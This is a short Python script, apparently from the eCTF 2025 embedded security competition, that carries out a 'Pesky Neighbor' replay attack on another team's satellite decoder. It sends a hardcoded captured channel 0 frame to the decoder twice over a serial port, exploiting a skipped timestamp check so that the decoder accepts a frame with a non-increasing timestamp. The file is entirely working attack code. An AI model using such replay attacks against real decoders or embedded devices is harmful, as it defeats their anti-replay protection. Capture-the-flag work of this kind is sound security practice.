"""Pesky Neighbor attack for tufts
@author: Gavin Zhong
@description: tufts bypass the timestamp check for channel 0, so by simply replaying lgmt channel 0 frame,
we can make it violate security requirement 3 (monotonically increasing timestamps)
"""

import time
import sys

# The ectf25 module comes pre-installed in the environment
from ectf25.utils.decoder import DecoderIntf

def lgmt_channel_0() -> bytes:
    """Gavin Zhong
        simply replay lgmt channel 0 frame
    """
    lgmt_frame_channel0 = b'c\xc6L\xdbn\xc0\xa6*\x19\xe6\x10\xc9\xafddn\x10\xbbTA\x8d"\xb2\x8a+X\x9bS\x0c"\x94>\xf1\x15S\x0c\xe21\xc5<\xfc=w^\xbd\xe0v\xd1Mu\x16m\xefAx\xe4Y\x0b\xf2_\xdf\xdd2\x1d\x89\xa1Cg\x1b__\x19f(\xffvbD\xa0\xea|\xed\xb4\xd70\xa0C\xe5)\xfaT%\xb4!\x8b\xd1\xa6\x9bZ~\xaf\xbb\xafb{\xf5\xdc\xdc24\x8a\xeda\x98\xabSN\xc2j\x1d\xda\xe4\x8c\x12W6R\xe0\x9e\xfb\x13\xe5\xb0\xcbe\xc7e\xc5\xf9\x8cR%\x19\x85;3\n\x92\x85\xabC\xe3\x94\xaa\xea\x8bs\xcb\xcb\xc3'
    return lgmt_frame_channel0


if __name__ == '__main__':
    print("Running Pesky Neighbor attack")
    time.sleep(1)
    
    # The serial port string will be in argv[1]
    interface = DecoderIntf(sys.argv[1])
    # Replay lgmt channel 0 frame
    interface.decode(lgmt_channel_0())
    interface.decode(lgmt_channel_0())

    print("Done with pesky Neighbor attack")
